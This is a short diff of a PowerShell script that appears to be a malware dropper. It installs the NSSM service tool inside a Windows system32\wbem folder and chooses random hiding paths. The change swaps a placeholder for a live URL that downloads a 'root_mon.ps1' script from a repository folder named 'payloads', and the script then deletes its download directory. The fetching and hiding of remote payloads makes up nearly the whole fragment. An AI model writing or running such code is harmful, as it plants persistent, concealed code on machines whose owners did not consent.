@@ -11,11 +11,6 @@ $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 
-if(($rootPath -eq "") -or ($rootPath -eq $null)){
-    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-    $rootPath = "$rootPath\root.ps1"
-}
-
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
 $scriptPath = $paths[$idx]
 $scriptPath = "$scriptPath\root_mon.ps1"
@@ -38,7 +33,7 @@ if(-not(Test-Path -Path $nssmexe)){
 }
 
 if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
-    iwr -Uri "ROOT_MON.ps1_URI" -OutFile $scriptPath
+    iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $scriptPath
 }
 
 Remove-Item -Path $downloadPath -Force -Recurse
